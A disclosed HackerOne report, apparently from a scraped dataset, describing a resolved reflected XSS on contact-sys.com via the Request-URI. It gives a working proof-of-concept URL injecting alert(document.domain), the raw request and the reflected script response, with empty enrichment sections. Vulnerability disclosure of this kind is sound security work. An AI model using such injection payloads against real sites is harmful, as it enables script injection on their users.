---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '164656'
original_report_id: '164656'
title: '[contact-sys.com] XSS via Request-URI'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2016-08-31T07:51:44.697Z'
disclosed_at: '2018-11-18T07:24:08.170Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [contact-sys.com] XSS via Request-URI

## Metadata

- HackerOne Report ID: 164656
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2018-11-18T07:24:08.170Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**PoC**
Открыть ссылку с помощью **Internet Explorer**
```
https://blackfan.ru/x?r=https://contact-sys.com/xxx'-alert(document.domain)],<!--/%252e%252e
```

**HTTP Request**
```http
GET /xxx'-alert(document.domain)],<!--/%2e%2e HTTP/1.1
Host: contact-sys.com
```

**HTTP Response**
```html
<script type="text/javascript">var routes=['xxx\\'-alert(1)],<!--','%2e%2e'],
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
